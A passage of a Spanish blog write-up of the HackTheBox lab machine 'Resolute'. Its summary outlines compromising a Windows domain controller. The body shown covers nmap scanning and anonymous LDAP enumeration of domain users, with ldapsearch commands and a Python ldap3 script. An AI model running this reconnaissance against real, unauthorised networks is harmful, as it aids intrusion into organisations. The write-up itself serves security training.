@@ -1,0 +1,2082 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Resolute</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Resolute | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Resolute" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel medio. Enumeraremos hasta más no poder un controlador de dominio, veremos contraseñas volando libremente e inyectaremos una DLL maliciosa en un servidor DNS 😲" />
+<meta property="og:description" content="Máquina Windows nivel medio. Enumeraremos hasta más no poder un controlador de dominio, veremos contraseñas volando libremente e inyectaremos una DLL maliciosa en un servidor DNS 😲" />
+<link rel="canonical" href="http://localhost:4000/htb/resolute" />
+<meta property="og:url" content="http://localhost:4000/htb/resolute" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-14T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220banner.png" />
+<meta property="twitter:title" content="HackTheBox - Resolute" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-08-14T00:00:00-07:00","datePublished":"2021-08-14T00:00:00-07:00","description":"Máquina Windows nivel medio. Enumeraremos hasta más no poder un controlador de dominio, veremos contraseñas volando libremente e inyectaremos una DLL maliciosa en un servidor DNS 😲","headline":"HackTheBox - Resolute","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/resolute"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/resolute"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Resolute</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-08-14">14 Aug 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220banner.png" alt="HackTheBox - Resolute">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel medio. Enumeraremos hasta más no poder un <strong>controlador de dominio</strong>, veremos contraseñas volando libremente e inyectaremos una <strong>DLL</strong> maliciosa en un servidor <strong>DNS</strong> 😲</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220resoluteHTB.png" alt="220resoluteHTB" /></p>
+
+<h2 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h2>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/1190">egre55</a>.</p>
+
+<p>El dinamismo ante todooooooooooo0OoooO!</p>
+
+<p>Nos enfrentaremos a un <strong>DC</strong> (controlador de dominio) to lindo, inicialmente enumeraremos el protocolo <strong>LDAP</strong>, con él conseguiremos bastante info de unos usuarios. Los recopilaremos para usarlos después.</p>
+
+<p>Jugaremos con <code>rpcclient</code> para enumerar el dominio un poco más, encontraremos una contraseña en la descripción del usuario <code>marko</code>, pero validándolas contra el sistema u otro servicio no serán válidas. Tomaremos los usuarios que obtuvimos antes y probaremos con cada uno esa contraseña. Finalmente tendremos como candidato válido el usuario <code>Melanie</code>, jugando con <code>evil-winrm</code> obtendremos una <strong>PowerShell</strong> en el sistema como ella.</p>
+
+<p>En un directorio del sistema encontraremos el log de unos comandos ejecutados en <strong>PowerShell</strong> (<code>PSTranscript</code>), con los ojos bien grandes veremos unas credenciales usadas por el usuario <code>Ryan</code> para intentar mapear unos directorios del sistema. Usaremos <strong>evil-winrm</strong> para obtener una nueva Shell.</p>
+
+<p>Veremos que <strong>Ryan</strong> esta en el grupo <code>DnsAdmins</code>, jugaremos con ese grupo para explotar el servidor <strong>DNS</strong>, inyectaremos una <code>DDL</code> maliciosa que al ser ejecutada nos devuelva una <strong>Reverse Shell</strong> como el usuario <code>nt authority\system</code> (:</p>
+
+<p>…</p>
+
+<h3 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Mucho real!! Bastante enumerar y manos ensuciar e.e</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>HAY QUE VIVIR TODOS LOS DÍAS!</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Enumeración de puertos con nmap</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puertos-ldap">Recorremos el protocolo <strong>LDAP</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación: encontramos usuarios en el servidor <strong>LDAP</strong></a>.
+    <ul>
+      <li><a href="#rpcclient-dc">Enumeramos un poquito más del <strong>Domain Controller</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#creds-pstranscript">Nos movemos de <strong>Melanie</strong> a <strong>Ryan</strong> viendo archivos del sistema</a>.</li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios: explotamos el grupo <strong>DnsAdmins</strong></a>.</li>
+  <li><a href="#manual-dll"><strong><u>Post-Explotación: Compilamos nuestra propia **DLL**</u></strong></a>.
+    <ul>
+      <li><a href="#repo-dns-exe-persistance">Generamos la <strong>DLL</strong> usando <strong>dns-exe-persistance</strong></a>.</li>
+      <li><a href="#repo-dnsadmin-dll">Generamos la <strong>DLL</strong> usando <strong>DNSAdmin-DLL</strong></a>.</li>
+    </ul>
+  </li>
+</ol>
+
+<p>…</p>
+
+<h1 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h1>
+
+<p>…</p>
+
+<h2 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">📌</a></h2>
+
+<p>Iniciaremos encontrando que puertos tiene activos y expuestos la máquina, para esto usaremos <code>nmap</code>:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.169 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos devuelve varios puertos:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Wed Aug 11 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.169
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.169 ()	Status: Up
+Host: 10.10.10.169 ()	Ports: 53/open/tcp//domain///, 88/open/tcp//kerberos-sec///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 389/open/tcp//ldap///, 445/open/tcp//microsoft-ds///, 464/open/tcp//kpasswd5///, 593/open/tcp//http-rpc-epmap///, 636/open/tcp//ldapssl///, 3268/open/tcp//globalcatLDAP///, 3269/open/tcp//globalcatLDAPssl///, 5985/open/tcp//wsman///, 9389/open/tcp//adws///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49670/open/tcp/////, 49676/open/tcp/////, 49677/open/tcp/////, 49688/open/tcp/////, 49712/open/tcp/////
+# Nmap done at Wed Aug 11 25:25:25 2021 -- 1 IP address (1 host up) scanned in 126.37 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>53</td>
+      <td style="text-align: left"><strong><a href="https://book.hacktricks.xyz/pentesting/pentesting-dns">DNS</a></strong>: Permite a internet identificar que dominio es de que IP y viceversa.</td>
+    </tr>
+    <tr>
+      <td>88</td>
+      <td style="text-align: left"><strong><a href="https://book.hacktricks.xyz/pentesting/pentesting-kerberos-88">Kerberos</a></strong>: Protocolo de autenticación.</td>
+    </tr>
+    <tr>
+      <td>135/593</td>
+      <td style="text-align: left"><strong><a href="https://book.hacktricks.xyz/pentesting/135-pentesting-msrpc">RPC</a></strong>: Permite la comunicación entre computadores de distintas redes sin problemas.</td>
+    </tr>
+    <tr>
+      <td>139/445</td>
+      <td style="text-align: left"><strong><a href="https://www.varonis.com/blog/smb-port/">SMB</a></strong>: Podemos compartir información entre dispositivos de una red.</td>
+    </tr>
+    <tr>
+      <td>389/636/3268/3269</td>
+      <td style="text-align: left"><strong><a href="https://book.hacktricks.xyz/pentesting/pentesting-ldap">LDAP</a></strong>: Protocolo que ayuda a la localización de “recursos” en una red.</td>
+    </tr>
+    <tr>
+      <td>464</td>
+      <td style="text-align: left"><strong><a href="https://security.stackexchange.com/questions/205492/what-is-this-service">kpasswd5</a></strong>: Relacionado con el protocolo <strong>kerberos</strong>: <code>Kerberos Password Change</code>.</td>
+    </tr>
+    <tr>
+      <td>5985/47001</td>
+      <td style="text-align: left"><strong><a href="https://www.pcwdld.com/what-is-winrm">WinRM</a></strong>: Usado para ejecutar tareas administrativas de una red.</td>
+    </tr>
+    <tr>
+      <td>9389</td>
+      <td style="text-align: left"><strong><a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-administrative-center">ADWS</a></strong>: <code>Active Directory Administrative Center</code>.</td>
+    </tr>
+    <tr>
+      <td>49664/49666</td>
+      <td style="text-align: left">No sabemos.</td>
+    </tr>
+    <tr>
+      <td>49667/49670/49676</td>
+      <td style="text-align: left">No sabemos.</td>
+    </tr>
+    <tr>
+      <td>49677/49688/49712</td>
+      <td style="text-align: left">Y no sabemos.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Uff, varios puertos…</p>
+
+<p>Ya teniendo conocimiento de los servicios que tiene activos la máquina, haremos otro escaneo, pero esta vez para descubrir que versiones y script están relacionados con cada servicio:</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.169
+    [*] Open ports: 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49666,49667,49670,49676,49677,49688,49712
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49666,49667,49670,49676,49677,49688,49712 -sC -sV 10.10.10.169 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Obtenemos:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Wed Aug 11 25:25:25 2021 as: nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49666,49667,49670,49676,49677,49688,49712 -sC -sV -oN portScan 10.10.10.169
+Nmap scan report for 10.10.10.169
+Host is up (0.12s latency).
+
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2021-08-11 16:45:18Z)
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc        Microsoft Windows RPC
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49670/tcp open  msrpc        Microsoft Windows RPC
+49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49677/tcp open  msrpc        Microsoft Windows RPC
+49688/tcp open  msrpc        Microsoft Windows RPC
+49712/tcp open  msrpc        Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=8/11%Time=6113FBAF%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"...
+SF:...x03");
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h32m36s, deviation: 4h02m31s, median: 12m35s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE\x00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System time: 2021-08-11T09:46:12-07:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2021-08-11T16:46:13
+|_  start_date: 2021-08-11T16:08:23
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Aug 11 25:25:25 2021 -- 1 IP address (1 host up) scanned in 173.51 seconds
+</code></pre>
+
+<p>Peeeerfecto, destacamos:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">389</td>
+      <td style="text-align: left">LDAP</td>
+      <td style="text-align: left">LDAP</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Un dominio: <code>megabank.local</code>.</li>
+</ul>
+
+<hr />
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">445</td>
+      <td style="text-align: left">SMB</td>
+      <td style="text-align: left">Windows Server 2016 Standard 14393</td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Vemos también el <a href="https://social.technet.microsoft.com/Forums/lync/es-ES/833097b4-30e4-4028-a59e-38d06c7024f5/para-que-sirve-un-grupo-de-trabajo?forum=win10itprogeneralES#11a41872-a3e7-4fa1-92af-291de8c17fda">grupo de trabajo</a> <code>MEGABANK</code>.</li>
+</ul>
+
+<p>Por el momento nada más, ahora si empecemos a romper de toooooooooodo 🕯️</p>
+
+<p>…</p>
+
+<h1 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="puertos-ldap">Protocolo <u>LDAP</u> <a href="#puertos-ldap">📌</a></h2>
+
+<p>Después de probar y probar cositas hacia el <strong>DNS</strong> o hacia <strong>SMB</strong> no encontramos nada :(</p>
+
+<p>Sin embargo si nos enfocamos en enumerar los recursos sostenidos por el protocolo <code>LDAP</code> vemos varias cositas interesantes…</p>
+
+<p>📥 <strong><em>“<code>LDAP</code> son las siglas de **Protocolo Ligero de Acceso a Directorio**, o en inglés **Lightweight Directory Access Protocol**). Se trata de un conjunto de protocolos de licencia abierta que son utilizados para **acceder a la información que está almacenada de forma centralizada** en una red.”</em></strong> <a href="https://www.profesionalreview.com/2019/01/05/ldap/">profesionalreview</a>.</p>
+
+<p>Muy bien, apoyados en <a href="https://book.hacktricks.xyz/pentesting/pentesting-ldap">esta guía</a> logramos profundizar y encontrar cadenas llamativas, empezaremos a jugar con un script de <code>nmap</code> que busca todos los recursos servidos por el protocolo y los muestra, se llama <a href="https://nmap.org/nsedoc/scripts/ldap-search.html">ldap-search</a>:</p>
+
+<pre><code class="language-bash">❱ nmap -p 389 --script "ldap-search" 10.10.10.169 -oN ldapSearch
+</code></pre>
+
+<p>Nos devuelve un gran output, pero ya en las primeras líneas podemos extraer info para seguir jugando:</p>
+
+<pre><code class="language-bash"># Nmap 7.80 scan initiated Wed Aug 11 25:25:25 2021 as: nmap -p 389 --script ldap-search -oN ldapSearch 10.10.10.169
+Nmap scan report for 10.10.10.169
+Host is up (0.11s latency).
+
+PORT    STATE SERVICE
+389/tcp open  ldap
+| ldap-search: 
+|   Context: DC=megabank,DC=local
+|     dn: DC=megabank,DC=local
+|         objectClass: top
+|         objectClass: domain
+|         objectClass: domainDNS
+|         distinguishedName: DC=megabank,DC=local
+...
+...
+...
+</code></pre>
+
+<p>Volvemos a ver el dominio de antes (<code>megabank.local</code>) pero separado, lo que realmente tenemos ahí es el <em>componente del dominio</em> (<code>DC</code>), que sería el objeto que toma el <strong>DNS</strong> como referencia para definir un “nombre de espacio” (como un “identificador”).</p>
+
+<p>Esto nos sirve para jugar a enumerar ese <strong>DC</strong>, ya sea con la herramienta <code>ldapsearch</code> o (hay más de 2 opciones claramente) con una librería de <strong>Python</strong> llamada <code>ldap3</code>.</p>
+
+<p>Empecemos con <code>ldapsearch</code> y después hacemos unos truquitos bonitos con <strong>Python</strong> y su librería <code>ldap3</code>.</p>
+
+<pre><code class="language-bash">❱ ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local"
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-h</td>
+      <td style="text-align: left">Le pasamos el servidor donde esta el protocolo <strong>LDAP</strong></td>
+    </tr>
+    <tr>
+      <td>-x</td>
+      <td style="text-align: left">Hacemos una autenticación simple, sin contraseña</td>
+    </tr>
+    <tr>
+      <td>-b</td>
+      <td style="text-align: left">Le indicamos cuál es la base de nuestra búsqueda</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Al ejecutarlo vemos el output que obtuvimos con <code>nmap</code> peeeeeeero muchas cosas más. Y descubrimos esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_ldapsearch_foundUsers.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Vemos al final varios usuarios, les muestro a <code>Simon</code> porque fue el primero que vi, pero hay unos cuantos, si detallamos la imagen hay dos líneas interesantes:</p>
+
+<ul>
+  <li>El <code>Common Name (CN)</code> contiene el nombre y apellido del usuario en el formato <code>Nombre Apellido</code> (nótese las mayus).</li>
+  <li>En el campo <code>userPrincipalName</code> esta el correo relacionado con ese usuario, pero también podemos destacar su formato: <code>nombre@megabank.local</code>.</li>
+</ul>
+
+<p>Esto es supremamente llamativo, ya que de una enumeración de recursos del servidor <code>LDAP</code> hemos encontrado usuarios relacionados con el <strong>Domain Controller</strong> <code>megabank.local</code> 🔥</p>
+
+<ul>
+  <li>Pa leer - <a href="https://www.informit.com/articles/article.aspx?p=101405&amp;seqNum=7">Términos extraños (CN, DC, DN, etc.) : Understanding Active Directory Services</a>.</li>
+</ul>
+
+<p>Pues si volvemos a ejecutar la instrucción, pero filtrando con <strong>grep</strong> por <code>cn:</code> (si no sabes por qué, vuelve a la imagen de arriba) para ver únicamente el nombre completo del usuario, nos damos cuenta de que la lista empieza con el usuario <code>Ryan</code>:</p>
+
+<pre><code class="language-bash">❱ ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local" | grep "cn:"
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_ldapsearch_grepCN1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Po muy bien, lo que podemos hacer ahora es filtrar desde <code>Ryan</code> hasta (por ejemplo) 30 líneas después:</p>
+
+<pre><code class="language-bash">❱ ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local" | grep "cn:" | grep "Ryan" -A 30
+cn: Ryan Bertrand
+cn: Marko Novak
+...
+</code></pre>
+
+<p>Ya tendríamos los usuarios, quitémosle el <code>cn:</code> y guardémoslos en un archivo:</p>
+
+<pre><code class="language-bash"># Separamos la cadena por sus espacios y nos quedamos con la segunda posicion en adelante (`2-`)
+❱ ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local" | grep "cn:" | grep "Ryan" -A 30 | cut -d " " -f2-
+</code></pre>
+
+<pre><code class="language-bash">❱ ldapsearch -h 10.10.10.169 -x -b "DC=megabank,DC=local" | grep "cn:" | grep "Ryan" -A 30 | cut -d " " -f2- &gt; users.txt 
+❱ cat users.txt | wc -l
+23
+</code></pre>
+
+<p>Hay <strong>23</strong> usuarios, antes de ponernos a probar fuerza bruta o cualquier otra cosa es muy importante interpretar en que entorno estamos.</p>
+
+<p>Si nos hemos dado cuenta estamos dentro de un <strong>directorio activo (Active Directory o AD)</strong>, que de una manera muuuuuuuy resumida ayuda a administrar políticas, credenciales, equipos y otras cositas de toooda la red.</p>
+
+<ul>
+  <li><a href="https://www.profesionalreview.com/2018/12/15/active-directory/">Más info AD - Active Directory Que es y para qué sirve</a>.</li>
+</ul>
+
+<p>Algo llamativo de los usuarios que existen en un <strong>AD</strong> son el formato en que son guardados (depende claramente de la empresa que gestiona ese AD).</p>
+
+<p>Tomaremos de ejemplo el usuario <code>Carlos Carlitos</code> y el dominio <code>nanai</code>: nos podemos encontrar varios “templates”:</p>
+
+<p>(<em>Imagina con mayus también</em>)</p>
+
+<ul>
+  <li><code>c.carlitos@nanai</code>.</li>
+  <li><code>ccarlitos@nanai</code>.</li>
+  <li><code>Carlos@nanai</code>.</li>
+  <li><code>CarlosCarlitos@nanai</code>.</li>
+</ul>
+
+<p>Y bueno, las demás formas que te puedas imaginar, esas serian las más conocidas y usadas. Pero, ¿de qué nos sirve esto? Bueno, muy sencillo, si en dado caso de probar el usuario <code>carlos</code> con tooooooodas las contraseñas posibles, pueda que ninguna nos dé resultado, ¿pero nos frenamos? Pues no, jugamos por ejemplo con un usuario llamado <code>ccarlitos</code> o <code>CarlosCarlitos</code> o bueno ya me entiendes :P el estar en un entorno como <strong>AD</strong> nos abre la puerta a más pruebas, ahora si sigamos…</p>
+
+<p>Veamos rápidamente como obtener los mismos usuarios pero con la librería de <code>ldap3</code> en <strong>Python3</strong>:</p>
+
+<ul>
+  <li><a href="https://book.hacktricks.xyz/pentesting/pentesting-ldap#manual">Basic Enumeration LDAP with <u>import ldap3</u></a>.</li>
+</ul>
+
+<p>Creamos el script:</p>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import ldap3
+
+# Nos conectamos al servidor LDAP
+server = ldap3.Server('10.10.10.169', get_info = ldap3.ALL, port = 389, use_ssl = False)
+connection = ldap3.Connection(server)
+connection.bind()
+
+# Buscamos en el Domain Controller y filtramos por los objetos "persona" con atributos Common Name
+connection.search(search_base='DC=megabank,DC=local', search_filter='(&amp;(objectClass=person))', search_scope='SUBTREE', attributes='CN')
+
+# Obtenemos un array como respuesta
+print(connection.entries)
+</code></pre>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/resolute/220bash_scriptPY_connectLDAP_users.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Listones, ya tendríamos los usuarios, esto nos permite jugar de toooooooooodas las formas posibles con ellos desde el mismo <strong>programa</strong>, nuestro script final con únicamente los usuarios sería este:</p>
+
+<pre><code class="language-py">#!/usr/bin/python3
+
+import ldap3
+import re
+
+server = ldap3.Server('10.10.10.169', get_info = ldap3.ALL, port = 389, use_ssl = False)
+connection = ldap3.Connection(server)
+connection.bind()
+
+connection.search(search_base='DC=megabank,DC=local', search_filter='(&amp;(objectClass=person))', search_scope='SUBTREE', attributes='CN')
+
+# Volvemos a extraer toda la data despues del `cn:` (texto que este entre varios rangos: de la 'A' a la 'Z', de la 'a' a la 'z', del '0' al '9' y espacios en blanco.
+users_array = re.findall(r'cn: [A-Za-z0-9\s].+', str(connection.entries))
+print(users_array)
+</code></pre>
+
